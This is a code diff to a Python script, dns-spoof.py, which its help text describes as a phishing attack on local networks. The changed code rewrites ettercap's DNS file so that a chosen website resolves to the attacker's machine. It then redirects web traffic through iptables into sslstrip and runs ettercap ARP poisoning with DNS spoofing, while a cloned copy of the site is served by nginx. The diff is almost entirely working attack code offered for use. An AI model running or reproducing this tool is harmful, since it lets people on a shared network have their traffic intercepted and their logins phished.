@@ -62,8 +62,11 @@ def get_ip_address(ifname):
 
 def update_etter_dns(conf_path):
     ip_address = get_ip_address(sys.argv[2])
-    new_line = sys.argv[1] + " A " + ip_address + "\n"
-    with open(conf_path, 'a+') as f:
+    subprocess.call(["rm",conf_path])
+
+    new_line = sys.argv[1] + " A " + ip_address + "\n" + \
+        sys.argv[1] + " PTR " + ip_address + "\n"
+    with open(conf_path, 'w+') as f:
         if new_line not in f.read():
             f.write(new_line)
 
@@ -76,9 +79,9 @@ def call_httrack(default_path):
         pass
     subprocess.call(["service","nginx","restart"])
     subprocess.call(["iptables","--flush","-t","nat"])
-    subprocess.call(["iptables","-t","nat","-A","PREROUTING","-p","tcp","--destination-port", \
+    subprocess.call(["iptables","-t","nat","-A","PREROUTING","-i",sys.argv[2],"-p","tcp","--destination-port", \
         "80","-j","REDIRECT","--to-port","6666"])
-    subprocess.Popen(["sslstrip","-l","6666"])
+    subprocess.Popen(["sslstrip","-l","6666"], stderr=subprocess.DEVNULL)
     subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])
 
 def check_executables():
@@ -93,11 +96,12 @@ def check_root():
 
 def print_help():
     exit("This program is used as a phishing attack on the local area network (LAN).\n" \
-        "Usage is python3 dns-spoof.py <website-name> <network interface name>\n" \
+        "USAGE: python3 dns-spoof.py <website-name> <network interface name>\n" \
         "Example of <website-name> is www.google.com, example of network interface name is eth0, wlan0.\n" \
-        "Dependencies for this program are nginx, ettercap, and locate.\n" \
-        "Additionally, this program must be run as the root user.\n" \
-        "Make sure a valid nginx.conf file is available on your machine for use by this program.")
+        "DEPENDENCIES: nginx, ettercap, locate, httrack, sslstrip.\n" \
+        "This program MUST be run as the ROOT user.\n" \
+        "This program requires that PORTS 80 and 6666 are set as OPEN in the firewall.\n" \
+        "Make sure a valid nginx.conf and etter.dns file is available on your machine.")
 
 def main():
     try:
@@ -110,7 +114,7 @@ def main():
             check_executables()
             default_nginx_path = update_nginx_conf(find_file("nginx.conf"))
             update_etter_dns(find_file("etter.dns"))
-
+            print("Make sure ports 80 and 6666 are open in the firewall.\n")
             call_httrack(default_nginx_path)
     except KeyboardInterrupt:
         exit()
